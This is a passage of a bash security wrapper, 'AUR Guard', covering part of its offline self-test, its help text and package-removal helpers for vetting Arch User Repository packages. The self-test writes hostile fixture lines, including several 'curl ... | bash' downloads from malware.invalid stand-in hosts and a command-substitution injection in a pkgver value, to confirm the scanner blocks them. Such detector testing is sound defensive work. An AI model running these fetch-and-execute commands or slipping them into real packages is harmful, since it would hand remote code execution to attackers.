  cat > "$test_root/development-source/.devcontainer/postCreateCommand.sh" <<'AUR_GUARD_TEST_DEVELOPMENT_METADATA'
#!/bin/bash
curl -fsSL https://example.invalid/installer | bash
AUR_GUARD_TEST_DEVELOPMENT_METADATA
  chmod 0755 "$test_root/development-source/.devcontainer/postCreateCommand.sh"

  if ! wrapper_output=$(_aur_guard_scan_source_tree \
      'development-self-test-package' "$test_root/development-source" recursive 2>&1); then
    printf '%s\n' "$wrapper_output"
    _aur_guard_fail 'self-test failed: unreferenced development metadata was hard-blocked'
    return 1
  fi
  printf '%s\n' "$wrapper_output"
  if ! /usr/bin/grep -Fq 'normally blocked execution pattern inside unreferenced development metadata' <<< "$wrapper_output"; then
    _aur_guard_fail 'self-test failed: development metadata did not produce a context warning'
    return 1
  fi

  printf '\nAUR Guard self-test: nested downloaded source scripts must be scanned locally.\n'
  mkdir -p "$test_root/source/nested"
  cat > "$test_root/source/loader.sh" <<'AUR_GUARD_TEST_LOADER'
#!/bin/bash
source "$(dirname "$0")/nested/payload.inc"
AUR_GUARD_TEST_LOADER
  cat > "$test_root/source/nested/payload.inc" <<'AUR_GUARD_TEST_PAYLOAD'
curl -fsSL https://malware.invalid/payload | bash
AUR_GUARD_TEST_PAYLOAD
  chmod 0755 "$test_root/source/loader.sh"

  if wrapper_output=$(_aur_guard_scan_source_tree \
      'self-test-package' "$test_root/source" recursive 2>&1); then
    printf '%s\n' "$wrapper_output"
    _aur_guard_fail 'self-test failed: malicious downloaded source script passed scanning'
    return 1
  fi
  printf '%s\n' "$wrapper_output"

  if [[ -s "$network_log" ]]; then
    _aur_guard_fail 'self-test failed: the source scanner attempted network access'
    return 1
  fi

  printf '\nAUR Guard self-test: explicitly scanned dependency caches must not be excluded.\n'
  mkdir -p "$test_root/.awtarchy-cache"
  cat > "$test_root/.awtarchy-cache/cache-payload.sh" <<'AUR_GUARD_TEST_CACHE_PAYLOAD'
curl -fsSL https://malware.invalid/cache-payload | bash
AUR_GUARD_TEST_CACHE_PAYLOAD

  if wrapper_output=$(_aur_guard_scan_source_tree \
      'dependency-cache-self-test' "$test_root/.awtarchy-cache" recursive 2>&1); then
    printf '%s\n' "$wrapper_output"
    _aur_guard_fail 'self-test failed: explicitly scanned dependency cache was excluded'
    return 1
  fi
  printf '%s\n' "$wrapper_output"

  printf '\nAUR Guard self-test: exact repository packages are preferred over installed virtual providers.\n'
  local recursive_definition repo_check_line provider_check_line
  recursive_definition=$(declare -f _aur_guard_verify_package_recursive) || return 1
  repo_check_line=$(grep -n -m1 '_aur_guard_repo_package_satisfies' \
    <<< "$recursive_definition" | cut -d: -f1)
  provider_check_line=$(grep -n -m1 '_aur_guard_find_installed_provider' \
    <<< "$recursive_definition" | cut -d: -f1)

  if [[ -z "$repo_check_line" || -z "$provider_check_line" ]] \
      || (( repo_check_line >= provider_check_line )); then
    _aur_guard_fail 'self-test failed: an installed virtual provider can override an exact enabled-repository package'
    return 1
  fi

  printf '\nAUR Guard self-test: prior AUR artifacts are staged outside nspawn private /tmp.\n'
  local prior_artifact_root prior_artifact_manifest prior_artifact_file
  prior_artifact_root="$test_root/prior-artifact-root"
  prior_artifact_manifest="$test_root/prior-artifacts.tsv"
  prior_artifact_file="$test_root/example-dependency-1-1-any.pkg.tar.zst"
  : > "$prior_artifact_file"
  printf 'example-base\texample-dependency\t%s\tdeadbeef\n' \
    "$prior_artifact_file" > "$prior_artifact_manifest"

  _AUR_GUARD_ARTIFACTS="$prior_artifact_manifest"
  sudo() {
    if [[ $1 == arch-nspawn ]]; then
      shift
      local root=$1
      shift
      local arg
      for arg in "$@"; do
        case "$arg" in
          /var/lib/awtarchy-dependencies/*)
            [[ -f "$root$arg" ]] || return 97
            ;;
          /tmp/awtarchy-dependencies/*|\
          /var/cache/pacman/pkg/awtarchy-dependencies/*)
            return 98
            ;;
        esac
      done
      return 0
    fi
    command "$@"
  }

  if ! _aur_guard_install_prior_artifacts_into_root "$prior_artifact_root"; then
    unset -f sudo
    _aur_guard_fail 'self-test failed: prior AUR artifacts were not visible inside the disposable build root'
    return 1
  fi
  unset -f sudo

  if [[ ! -f "$prior_artifact_root/var/lib/awtarchy-dependencies/$(basename -- "$prior_artifact_file")" ]]; then
    _aur_guard_fail 'self-test failed: prior AUR artifact was not staged in a path visible through arch-nspawn'
    return 1
  fi

  if declare -f _aur_guard_scan_artifact \
      | grep -q '_aur_guard_add_context_warning'; then
    _aur_guard_fail 'self-test failed: obsolete artifact warning helper reference remains'
    return 1
  fi

  printf '\nAUR Guard self-test: locked pnpm dependencies are prefetched into a persistent store before offline builds.\n'
  local pnpm_test_dir pnpm_test_root pnpm_call_log sandbox_definition
  pnpm_test_dir="$test_root/pnpm-prefetch"
  pnpm_test_root="$test_root/pnpm-root"
  pnpm_call_log="$test_root/pnpm-prefetch-call.log"
  mkdir -p \
    "$pnpm_test_dir/.awtarchy-build/project" \
    "$pnpm_test_root/usr/bin" \
    "$pnpm_test_root/usr/lib/pnpm"
  : > "$pnpm_test_dir/.awtarchy-build/project/pnpm-lock.yaml"
  : > "$pnpm_test_root/usr/lib/pnpm/pnpm.cjs"
  chmod 0755 "$pnpm_test_root/usr/lib/pnpm/pnpm.cjs"
  ln -s /usr/lib/pnpm/pnpm.cjs "$pnpm_test_root/usr/bin/pnpm"

  sandbox_definition=$(declare -f _aur_guard_sandbox_exec) || return 1
  _AUR_GUARD_SANDBOX_ROOTFS="$pnpm_test_root"
  _aur_guard_sandbox_exec() {
    printf '%s\n' "$@" > "$pnpm_call_log"
  }

  if ! _aur_guard_prefetch_pnpm_dependencies \
      'pnpm-self-test-package' "$pnpm_test_dir"; then
    eval "$sandbox_definition"
    unset _AUR_GUARD_SANDBOX_ROOTFS
    _aur_guard_fail 'self-test failed: locked pnpm dependency prefetch was not invoked'
    return 1
  fi
  eval "$sandbox_definition"
  unset _AUR_GUARD_SANDBOX_ROOTFS

  if ! grep -Fq 'exec /usr/bin/pnpm fetch --frozen-lockfile' "$pnpm_call_log" \
      || ! grep -Fxq '/work/.awtarchy-build/project' "$pnpm_call_log"; then
    _aur_guard_fail 'self-test failed: pnpm prefetch did not use the locked project inside the network sandbox'
    return 1
  fi

  sandbox_definition=$(declare -f _aur_guard_sandbox_exec) || return 1
  if ! grep -Fq 'pnpm_config_store_dir' <<< "$sandbox_definition" \
      || ! grep -Fq 'pnpm_config_offline true' <<< "$sandbox_definition"; then
    _aur_guard_fail 'self-test failed: pnpm cache persistence or forced offline mode is missing'
    return 1
  fi

  sandbox_definition=$(declare -f _aur_guard_prefetch_pnpm_dependencies) || return 1
  if ! grep -Fq 'pnpm_config_ignore_scripts=true' <<< "$sandbox_definition"; then
    _aur_guard_fail 'self-test failed: pnpm prefetch could execute dependency lifecycle scripts'
    return 1
  fi

  printf '\nAUR Guard self-test: lockfile-resolved node_modules files use a separate complete-scan ceiling.\n'
  local dependency_limit_root saved_source_limit saved_dependency_limit dependency_scan_output
  dependency_limit_root="$test_root/dependency-limit"
  mkdir -p "$dependency_limit_root/project/node_modules/example"
  printf '%s\n' '#!/bin/bash' 'printf source' > "$dependency_limit_root/source.sh"
  printf '%s\n' 'console.log("dependency one");' \
    > "$dependency_limit_root/project/node_modules/example/one.js"
  printf '%s\n' 'console.log("dependency two");' \
    > "$dependency_limit_root/project/node_modules/example/two.js"

  saved_source_limit=$_AUR_GUARD_SOURCE_SCAN_MAX_FILES
  saved_dependency_limit=$_AUR_GUARD_DEPENDENCY_SCAN_MAX_FILES
  _AUR_GUARD_SOURCE_SCAN_MAX_FILES=1
  _AUR_GUARD_DEPENDENCY_SCAN_MAX_FILES=2

  if ! dependency_scan_output=$(_aur_guard_scan_source_tree \
      'dependency-limit-self-test' "$dependency_limit_root" recursive 2>&1); then
    _AUR_GUARD_SOURCE_SCAN_MAX_FILES=$saved_source_limit
    _AUR_GUARD_DEPENDENCY_SCAN_MAX_FILES=$saved_dependency_limit
    printf '%s\n' "$dependency_scan_output"
    _aur_guard_fail 'self-test failed: lockfile dependency files incorrectly consumed the ordinary source-file ceiling'
    return 1
  fi
  _AUR_GUARD_SOURCE_SCAN_MAX_FILES=$saved_source_limit
  _AUR_GUARD_DEPENDENCY_SCAN_MAX_FILES=$saved_dependency_limit

  if ! grep -Fq '2 scanned files were lockfile-resolved dependency-cache files' \
      <<< "$dependency_scan_output"; then
    _aur_guard_fail 'self-test failed: node_modules dependency files were not counted separately'
    return 1
  fi
  printf '%s\n' "$dependency_scan_output"

  printf '\nAUR Guard self-test: PKGBUILD review uses clean line-numbered source and diff views.\n'
  local review_old review_new review_output review_current_output
  review_old="$test_root/PKGBUILD.old"
  review_new="$test_root/PKGBUILD.new"
  cat > "$review_old" <<'AUR_GUARD_TEST_PKGBUILD_OLD'
pkgname=review-demo
pkgver=1
package() {
  install -Dm755 review-demo "$pkgdir/usr/bin/review-demo"
}
AUR_GUARD_TEST_PKGBUILD_OLD
  cat > "$review_new" <<'AUR_GUARD_TEST_PKGBUILD_NEW'
pkgname=review-demo
pkgver=2
package() {
  git clone https://example.invalid/plugin.git "$srcdir/plugin"
  systemctl --root="$pkgdir" enable review-demo.service
  install -Dm755 review-demo "$pkgdir/usr/bin/review-demo"
}
AUR_GUARD_TEST_PKGBUILD_NEW

  if ! review_output=$(AUR_GUARD_COLOR=never _aur_guard_render_pkgbuild_diff \
      "$review_old" "$review_new" \
      'review-demo previous successful install' \
      'review-demo verified AUR test'); then
    _aur_guard_fail 'self-test failed: PKGBUILD review diff could not be rendered'
    return 1
  fi
  if _aur_guard_review_color_enabled; then
    AUR_GUARD_COLOR=always _aur_guard_render_pkgbuild_diff \
      "$review_old" "$review_new" \
      'review-demo previous successful install' \
      'review-demo verified AUR test'
  else
    printf '%s\n' "$review_output"
  fi

  if ! grep -Fq "git clone https://example.invalid/plugin.git \"\$srcdir/plugin\"  [FLAGGED: network/download]" \
      <<< "$review_output" \
      || ! grep -Fq "systemctl --root=\"\$pkgdir\" enable review-demo.service  [FLAGGED: privilege/system change]" \
      <<< "$review_output" \
      || ! grep -Eq '^[[:space:]]*OLD[[:space:]]+NEW[[:space:]]+│[[:space:]]+PKGBUILD$' \
      <<< "$review_output"; then
    _aur_guard_fail 'self-test failed: PKGBUILD diff view was not line-numbered or did not flag attention-worthy added lines'
    return 1
  fi

  if ! review_current_output=$(AUR_GUARD_COLOR=never \
      _aur_guard_render_current_pkgbuild "$review_new"); then
    _aur_guard_fail 'self-test failed: current PKGBUILD source view could not be rendered'
    return 1
  fi

  if ! grep -Eq '^[[:space:]]*1[[:space:]]+│[[:space:]]+pkgname=review-demo$' \
      <<< "$review_current_output" \
      || grep -Fq '\n' <<< "$review_current_output"; then
    _aur_guard_fail 'self-test failed: current PKGBUILD source view was bunched together instead of using real line breaks'
    return 1
  fi

  printf '\nAUR Guard self-test: maintainer changes force deep review, explicit continuation, and exact confirmation.\n'
  local identity_pkgdir identity_state identity_status identity_output
  local identity_phrase identity_now identity_metadata
  local identity_reject_output identity_review_status
  identity_pkgdir="$test_root/identity-package"
  identity_state="$test_root/identity-state"
  mkdir -p "$identity_pkgdir" "$identity_state/pkgbuilds/review-demo"
  cp -- "$review_new" "$identity_pkgdir/PKGBUILD"
  cp -- "$review_old" "$identity_state/pkgbuilds/review-demo/PKGBUILD"

  cat > "$identity_state/pkgbuilds/review-demo/metadata" <<'AUR_GUARD_TEST_OLD_METADATA'
commit=1111111111111111111111111111111111111111
maintainer=old-maintainer
last_modified=1
saved_at=2026-01-01T00:00:00Z
installed=review-demo=1.0-1
AUR_GUARD_TEST_OLD_METADATA

  cat > "$test_bin/pacman" <<'AUR_GUARD_TEST_IDENTITY_PACMAN'
#!/bin/sh
if [ "$1" = "-Q" ] && [ "$2" = "review-demo" ]; then
  printf '%s\n' 'review-demo 1.0-1'
  exit 0
fi
exit 1
AUR_GUARD_TEST_IDENTITY_PACMAN
  chmod 0755 "$test_bin/pacman"

  _AUR_GUARD_STATE_DIR="$identity_state"
  _AUR_GUARD_MANIFEST="$test_root/identity-manifest.tsv"
  _AUR_GUARD_REQUIRED_PACKAGES="$test_root/identity-required.tsv"
  _AUR_GUARD_AUR_METADATA="$test_root/identity-current.tsv"
  _AUR_GUARD_IDENTITY_CHANGES="$test_root/identity-changes.tsv"
  _AUR_GUARD_IDENTITY_ASSESSED=0
  identity_now=$(date +%s)
  printf 'review-demo\t2222222222222222222222222222222222222222\thttps://aur.archlinux.org/review-demo.git\t(requested)\t%s\n' \
    "$identity_pkgdir" > "$_AUR_GUARD_MANIFEST"
  printf 'review-demo\treview-demo\n' > "$_AUR_GUARD_REQUIRED_PACKAGES"
  printf 'review-demo\tnew-maintainer\t%s\n' "$((identity_now - 1800))" \
    > "$_AUR_GUARD_AUR_METADATA"
  : > "$_AUR_GUARD_IDENTITY_CHANGES"

  if _aur_guard_assess_aur_identity; then
    _aur_guard_fail 'self-test failed: a saved maintainer change was not detected'
    return 1
  else
    identity_status=$?
  fi
  if (( identity_status != 10 )); then
    _aur_guard_fail 'self-test failed: maintainer-change assessment returned the wrong status'
    return 1
  fi

  if ! identity_output=$(AUR_GUARD_COLOR=never \
      _aur_guard_review_installed_pkgbuilds <<< 'y' 2>&1); then
    printf '%s\n' "$identity_output"
    _aur_guard_fail 'self-test failed: mandatory maintainer-change review could not be rendered and approved'
    return 1
  fi
  printf '%s\n' "$identity_output"

  if ! grep -Fq 'Maintainer: old-maintainer -> new-maintainer [CHANGED]' \
      <<< "$identity_output" \
      || ! grep -Fq 'Risk: CRITICAL - maintainer changed on a recent AUR revision' \
      <<< "$identity_output" \
      || ! grep -Fq 'Maintainer ownership changed. PKGBUILD display is mandatory.' \
      <<< "$identity_output" \
      || ! grep -Fq 'Continue with the verified clean build? [y/N]:' \
      <<< "$identity_output" \
      || ! grep -Fq 'PKGBUILD review approved; continuing with the verified clean build.' \
      <<< "$identity_output"; then
    _aur_guard_fail 'self-test failed: maintainer-change review or explicit build-continuation output is missing'
    return 1
  fi

  if identity_reject_output=$(AUR_GUARD_COLOR=never \
      _aur_guard_review_installed_pkgbuilds <<< 'n' 2>&1); then
    printf '%s\n' "$identity_reject_output"
    _aur_guard_fail 'self-test failed: a rejected post-review build confirmation returned success'
    return 1
  else
    identity_review_status=$?
  fi

  if (( identity_review_status != 20 )) \
      || ! grep -Fq 'Build cancelled after PKGBUILD review.' \
      <<< "$identity_reject_output"; then
    printf '%s\n' "$identity_reject_output"
    _aur_guard_fail 'self-test failed: rejected post-review build confirmation did not cancel cleanly'
    return 1
  fi

  identity_phrase=$(_aur_guard_identity_confirmation_phrase) || return 1
  if _aur_guard_confirm_identity_changes <<< 'WRONG CONFIRMATION' >/dev/null 2>&1; then
    _aur_guard_fail 'self-test failed: incorrect maintainer-change confirmation was accepted'
    return 1
  fi
  if ! _aur_guard_confirm_identity_changes <<< "$identity_phrase" >/dev/null 2>&1; then
    _aur_guard_fail 'self-test failed: exact maintainer-change confirmation was rejected'
    return 1
  fi

  if ! _aur_guard_store_pkgbuild_snapshots; then
    _aur_guard_fail 'self-test failed: successful-install maintainer metadata could not be saved'
    return 1
  fi
  identity_metadata="$identity_state/pkgbuilds/review-demo/metadata"
  if ! grep -Fxq 'maintainer=new-maintainer' "$identity_metadata" \
      || ! grep -Fq 'last_modified=' "$identity_metadata"; then
    _aur_guard_fail 'self-test failed: the successful-install snapshot omitted current AUR identity metadata'
    return 1
  fi

  _AUR_GUARD_IDENTITY_ASSESSED=0
  if ! _aur_guard_assess_aur_identity; then
    _aur_guard_fail 'self-test failed: an unchanged saved maintainer produced a false positive'
    return 1
  fi
  if [[ -s "$_AUR_GUARD_IDENTITY_CHANGES" ]]; then
    _aur_guard_fail 'self-test failed: unchanged maintainer metadata left a critical-change record'
    return 1
  fi

  printf '%s\n' '#!/bin/sh' 'exit 1' > "$test_bin/pacman"
  chmod 0755 "$test_bin/pacman"

  local aurup_definition identity_assess_line deep_restart_line build_line
  local install_line snapshot_line
  aurup_definition=$(declare -f aurinstall) || return 1
  identity_assess_line=$(grep -n -m1 '_aur_guard_assess_aur_identity' \
    <<< "$aurup_definition" | cut -d: -f1)
  deep_restart_line=$(grep -n -m1 'Discarding practical-mode work and restarting automatically in deep mode' \
    <<< "$aurup_definition" | cut -d: -f1)
  build_line=$(grep -n -m1 '_aur_guard_build_verified_artifacts' \
    <<< "$aurup_definition" | cut -d: -f1)
  install_line=$(grep -n -m1 '_aur_guard_install_verified_transaction' \
    <<< "$aurup_definition" | cut -d: -f1)
  snapshot_line=$(grep -n -m1 '_aur_guard_store_pkgbuild_snapshots' \
    <<< "$aurup_definition" | cut -d: -f1)

  if [[ -z "$identity_assess_line" || -z "$deep_restart_line" || -z "$build_line" \
      || -z "$install_line" || -z "$snapshot_line" ]] \
      || (( identity_assess_line >= deep_restart_line )) \
      || (( deep_restart_line >= build_line )) \
      || (( install_line >= snapshot_line )); then
    _aur_guard_fail 'self-test failed: maintainer changes do not force deep mode before building or metadata is saved before installation'
    return 1
  fi

  printf 'AUR Guard self-test: practical mode is the default and deep mode remains explicit.\n'
  local _AUR_GUARD_MODE='practical'
  if _aur_guard_is_deep_mode; then
    _aur_guard_fail 'self-test failed: practical mode was treated as deep mode'
    return 1
  fi
  _AUR_GUARD_MODE='deep'
  if ! _aur_guard_is_deep_mode; then
    _aur_guard_fail 'self-test failed: explicit deep mode was not recognized'
    return 1
  fi
  _AUR_GUARD_MODE='practical'

  printf '
AUR Guard self-test: insignificant .SRCINFO endings and dependency-owned license links are accepted.
'
  cat > "$test_root/srcinfo-committed" <<'AUR_GUARD_TEST_SRCINFO_COMMITTED'
pkgbase = metadata-self-test  
	pkgname = metadata-self-test


AUR_GUARD_TEST_SRCINFO_COMMITTED
  cat > "$test_root/srcinfo-generated" <<'AUR_GUARD_TEST_SRCINFO_GENERATED'
pkgbase = metadata-self-test
	pkgname = metadata-self-test
AUR_GUARD_TEST_SRCINFO_GENERATED
  _aur_guard_normalize_srcinfo "$test_root/srcinfo-committed" \
    > "$test_root/srcinfo-committed.normalized"
  _aur_guard_normalize_srcinfo "$test_root/srcinfo-generated" \
    > "$test_root/srcinfo-generated.normalized"
  if ! cmp -s \
      "$test_root/srcinfo-committed.normalized" \
      "$test_root/srcinfo-generated.normalized"; then
    _aur_guard_fail 'self-test failed: insignificant .SRCINFO trailing whitespace or blank lines remained significant'
    return 1
  fi

  mkdir -p "$test_root/license-link/usr/share/licenses"
  cat > "$test_root/license-link/.PKGINFO" <<'AUR_GUARD_TEST_LICENSE_PKGINFO'
pkgname = license-self-test
depend = dependency-license>=1
AUR_GUARD_TEST_LICENSE_PKGINFO
  ln -s /usr/share/licenses/dependency-license \
    "$test_root/license-link/usr/share/licenses/license-self-test"
  if ! _aur_guard_absolute_license_link_is_safe \
      "$test_root/license-link/usr/share/licenses/license-self-test" \
      /usr/share/licenses/dependency-license \
      "$test_root/license-link" \
      license-self-test; then
    _aur_guard_fail 'self-test failed: dependency-owned license link was rejected'
    return 1
  fi
  if _aur_guard_absolute_license_link_is_safe \
      "$test_root/license-link/usr/share/licenses/license-self-test" \
      /usr/share/licenses/undeclared-package \
      "$test_root/license-link" \
      license-self-test; then
    _aur_guard_fail 'self-test failed: license link to an undeclared dependency was accepted'
    return 1
  fi

  printf '\nAUR Guard self-test: VCS pkgver() updates may change only the pkgver assignment.\n'
  local vcs_test_dir="$test_root/vcs-pkgver"
  local saved_vcs_snapshots="${_AUR_GUARD_VCS_SNAPSHOTS:-}"
  local saved_test_path="$PATH"
  PATH=/usr/bin:/bin
  mkdir -p "$vcs_test_dir"
  cat > "$vcs_test_dir/PKGBUILD" <<'AUR_GUARD_TEST_VCS_PKGBUILD'
pkgname=vcs-self-test
pkgver=1
pkgrel=3
arch=('any')
source=('example::git+https://example.invalid/project.git')
sha256sums=('SKIP')

pkgver() {
  printf '2'
}

package() {
  :
}
AUR_GUARD_TEST_VCS_PKGBUILD
  (
    cd "$vcs_test_dir" || exit 1
    git init -q
    git config user.name 'AUR Guard Self Test'
    git config user.email 'aur-guard@example.invalid'
    git add PKGBUILD
    git commit -qm 'baseline'
  )
  _AUR_GUARD_VCS_SNAPSHOTS="$test_root/vcs-snapshots.tsv"
  printf 'vcs-self-test\texample\t%s\thttps://example.invalid/project.git\n' \
    '1111111111111111111111111111111111111111' > "$_AUR_GUARD_VCS_SNAPSHOTS"

  _aur_guard_prepare_pkgbuild_mutation_state 'vcs-self-test' "$vcs_test_dir" || return 1
  sed -i 's/^pkgver=1$/pkgver=2/' "$vcs_test_dir/PKGBUILD"
  _aur_guard_accept_prepared_pkgver_update 'vcs-self-test' "$vcs_test_dir" || {
    _aur_guard_fail 'self-test failed: deterministic VCS pkgver update was rejected'
    return 1
  }
  _aur_guard_assert_prepared_pkgbuild_state 'vcs-self-test' "$vcs_test_dir" || return 1

  printf '\n# unexpected mutation\n' >> "$vcs_test_dir/PKGBUILD"
  if _aur_guard_assert_prepared_pkgbuild_state 'vcs-self-test' "$vcs_test_dir"; then
    _aur_guard_fail 'self-test failed: non-pkgver PKGBUILD mutation was accepted after preparation'
    return 1
  fi
  cp -a "$vcs_test_dir/.awtarchy-pkgbuild-state/prepared" "$vcs_test_dir/PKGBUILD"
  _aur_guard_restore_original_pkgbuild 'vcs-self-test' "$vcs_test_dir" || return 1

  _aur_guard_prepare_pkgbuild_mutation_state 'vcs-self-test' "$vcs_test_dir" || return 1
  sed -i -e 's/^pkgver=1$/pkgver=2/' -e 's/^pkgrel=3$/pkgrel=1/' \
    "$vcs_test_dir/PKGBUILD"
  _aur_guard_accept_prepared_pkgver_update 'vcs-self-test' "$vcs_test_dir" || {
    _aur_guard_fail 'self-test failed: deterministic VCS pkgver update with pkgrel reset was rejected'
    return 1
  }
  _aur_guard_assert_prepared_pkgbuild_state 'vcs-self-test' "$vcs_test_dir" || return 1
  _aur_guard_restore_original_pkgbuild 'vcs-self-test' "$vcs_test_dir" || return 1

  _aur_guard_prepare_pkgbuild_mutation_state 'vcs-self-test' "$vcs_test_dir" || return 1
  sed -i -e 's/^pkgver=1$/pkgver=2/' -e 's/^pkgrel=3$/pkgrel=2/' \
    "$vcs_test_dir/PKGBUILD"
  if _aur_guard_accept_prepared_pkgver_update 'vcs-self-test' "$vcs_test_dir"; then
    _aur_guard_fail 'self-test failed: nonstandard VCS pkgrel change was accepted'
    return 1
  fi
  _aur_guard_restore_original_pkgbuild 'vcs-self-test' "$vcs_test_dir" || return 1

  _aur_guard_prepare_pkgbuild_mutation_state 'vcs-self-test' "$vcs_test_dir" || return 1
  # This test intentionally writes a literal command substitution.
  # shellcheck disable=SC2016
  sed -i 's/^pkgver=1$/pkgver=$(touch unsafe)/' "$vcs_test_dir/PKGBUILD"
  if _aur_guard_accept_prepared_pkgver_update 'vcs-self-test' "$vcs_test_dir"; then
    _aur_guard_fail 'self-test failed: unsafe generated pkgver assignment was accepted'
    return 1
  fi
  _aur_guard_restore_original_pkgbuild 'vcs-self-test' "$vcs_test_dir" || return 1

  _AUR_GUARD_VCS_SNAPSHOTS="$saved_vcs_snapshots"
  PATH="$saved_test_path"

  printf '\nAUR Guard self-test: installer mode auto-accepts only routine conflict/replacement metadata.\n'
  local saved_installer_mode
  saved_installer_mode=${_AUR_GUARD_INSTALLER_MODE:-0}
  _AUR_GUARD_INSTALLER_MODE=1
  _AUR_GUARD_HISTORICAL_MATCHES=()
  _AUR_GUARD_CONTEXT_WARNINGS=()
  _AUR_GUARD_CONTEXT_WARNINGS['bootstrap package conflict']='conflict=example'

  if ! wrapper_output=$(_aur_guard_confirm_guarded_install 'bootstrap-demo' </dev/null 2>&1); then
    printf '%s\n' "$wrapper_output"
    _aur_guard_fail 'self-test failed: installer mode rejected a routine package conflict warning'
    return 1
  fi
  if ! grep -Fq 'automatically acknowledging routine package conflict/replacement metadata' \
      <<< "$wrapper_output"; then
    _aur_guard_fail 'self-test failed: installer-mode routine-warning acknowledgement was not reported'
    return 1
  fi

  _AUR_GUARD_CONTEXT_WARNINGS=()
  _AUR_GUARD_CONTEXT_WARNINGS['bootstrap source-host']='source host requires review'
  if _aur_guard_confirm_guarded_install 'bootstrap-demo' </dev/null >/dev/null 2>&1; then
    _aur_guard_fail 'self-test failed: installer mode auto-accepted a non-routine source warning'
    return 1
  fi

  _AUR_GUARD_CONTEXT_WARNINGS=()
  _AUR_GUARD_HISTORICAL_MATCHES=()
  _AUR_GUARD_HISTORICAL_MATCHES['bootstrap-demo']='historical-test-source'
  if _aur_guard_confirm_guarded_install 'bootstrap-demo' </dev/null >/dev/null 2>&1; then
    _aur_guard_fail 'self-test failed: installer mode auto-accepted a historical incident warning'
    return 1
  fi

  _AUR_GUARD_HISTORICAL_MATCHES=()
  _AUR_GUARD_CONTEXT_WARNINGS=()
  _AUR_GUARD_INSTALLER_MODE=$saved_installer_mode

  mkdir -p "$test_root/benign-source"
  cat > "$test_root/benign-source/reference.sh" <<'AUR_GUARD_TEST_REFERENCE'
#!/bin/bash
printf '%s\n' 'Documentation: https://example.invalid/reference'
AUR_GUARD_TEST_REFERENCE
  chmod 0755 "$test_root/benign-source/reference.sh"

  if ! wrapper_output=$(_aur_guard_scan_source_tree \
      'benign-self-test-package' "$test_root/benign-source" recursive 2>&1); then
    printf '%s\n' "$wrapper_output"
    _aur_guard_fail 'self-test failed: a non-executed URL reference was incorrectly treated as malware'
    return 1
  fi
  printf '%s\n' "$wrapper_output"

  if [[ -s "$network_log" ]]; then
    _aur_guard_fail 'self-test failed: URL reporting crawled a referenced website'
    return 1
  fi

  _aur_guard_pass 'dry-run passed: emergency blocks, read-only helper queries, blocked helper transactions, package-name validation, strong and content-addressed integrity, detached signature sidecars, normalized .SRCINFO endings, safe internal and dependency-license symlinks, inert identity-comment handling, single-pass artifact analysis, progress reporting, in-process symlink normalization, constrained icon-theme archive limits, private disk-backed work storage, clean line-numbered PKGBUILD review rendering, maintainer-change tracking and confirmation, recent-revision risk summaries, practical/deep mode selection, exact repository-package preference, persistent AUR artifact staging, locked pnpm prefetching, deterministic VCS pkgver/pkgrel handling, installer-safe routine warning handling, public-network sandbox filtering without pasta namespace attachment, separate dependency-cache scan limits, and no-crawl behavior worked'
)

aurhelp() {
  cat <<'AUR_GUARD_HELP'
AUR Guard quick help

Help commands:
  aur
  aurguard
  aurhelp

Allowed direct helper queries:
  yay -Qiu                  inspect installed packages with available upgrades
  yay -Qm                   list installed foreign/AUR packages
  yay -Ss package           search packages
  paru supports the same read-only queries

Blocked:
  Direct helper install, update, remove, build, and cleanup transactions

Safe workflow:
  aurinstalled              list installed foreign/AUR packages and versions
  sysupdate                 update enabled pacman repository packages
  aurcheck                  show AUR updates, emergency blocks, and historical warnings
  aurverify package         practical packaging and upstream-source verification
  aurverify --deep package  add exhaustive upstream and dependency-cache scanning
  aurinstall package             practical clean-root build and install
  aurinstall --deep package      exhaustive offline build and artifact inspection
  aurguardtest              run the offline AUR Guard self-test

Upgrade review:
  For already-installed AUR packages, aurinstall shows maintainer identity, AUR
  revision age, PKGBUILD change status, and flagged additions before building.
  Normal PKGBUILD changes remain optional to display. A maintainer change forces
  deep verification, mandatory PKGBUILD display, and exact confirmation.
  AUR_GUARD_RECENT_CHANGE_HOURS controls the informational recent-change window.

Examples:
  aurinstalled
  yay -Qiu
  yay -Qm
  sysupdate
  aurcheck
  aurverify awtwall
  aurverify --deep awtwall
  aurinstall awtwall
  aurinstall --deep awtwall

Unsafe override:
  aurunsafe yay -S package
  aurunsafe yay -Syu
  aurunsafe paru -S package
  aurunsafe paru -Syu

Important:
  AUR packages are not official Arch packages.
  The downloaded incident lists are historical affected-package records.
  Historical and dependency-context warnings require explicit install confirmation.
  Only the built-in emergency list and current malicious patterns hard-block installation.
  AUR RPC, Git, helper update checks, source downloads, and PKGBUILD execution are sandboxed.
  Network-enabled sandboxes block loopback, LAN, link-local, Tailscale CGNAT, and multicast ranges.
  Practical mode scans AUR-controlled packaging, verifies immutable upstream sources, and avoids antivirus-style recursive source scanning.
  Practical builds use disposable clean roots with restricted public-only network access.
  Deep mode additionally scans extracted upstream trees and dependency caches, then builds without network.
  Pacman install scripts, setuid/setgid files, capabilities, special files, and privileged auto-activation paths are blocked.
  Final artifacts have metadata, paths, links, privileges, hashes, and activation points checked before one pacman transaction.
  Source verification requires strong checksums, exact VCS commits, or matching signatures pinned by validpgpkeys.
  Source-host matching is a useful review signal, not proof that upstream code is harmless.
  PKGBUILD reviews use an AUR-style line-numbered view; green lines are unflagged and red [FLAGGED] lines are heuristic attention markers, not proof of malicious code.
  PKGBUILD snapshots are saved only after a successful verified installation.
AUR_GUARD_HELP
}

aurinstalled() {
  local output

  if ! output=$(command pacman -Qm 2>/dev/null); then
    printf 'Unable to query installed foreign packages with pacman.\n' >&2
    return 1
  fi

  if [[ -z "$output" ]]; then
    printf 'No foreign/AUR packages are currently installed.\n'
    return 0
  fi

  printf 'Installed foreign/AUR packages and versions:\n'
  printf '%s\n' "$output"
}

aurremove() {
  local pkg
  local -a packages=()

  if (( $# == 0 )); then
    printf 'Usage: aurremove package_name [package_name ...]\n' >&2
    printf 'Alias: auruninstall package_name [package_name ...]\n' >&2
    return 1
  fi

  for pkg in "$@"; do
    _aur_guard_validate_package_name "$pkg" || return 1

    if ! command pacman -Q "$pkg" >/dev/null 2>&1; then
      printf 'AUR Guard: package is not installed: %s\n' "$pkg" >&2
      return 1
    fi

    if ! command pacman -Qm "$pkg" >/dev/null 2>&1; then
      printf 'AUR Guard: %s is not currently a foreign/AUR package.\n' "$pkg" >&2
      printf 'For repository packages, use:\n' >&2
      printf '  sudo pacman -Rns -- %q\n' "$pkg" >&2
      return 1
    fi

    packages+=("$pkg")
  done

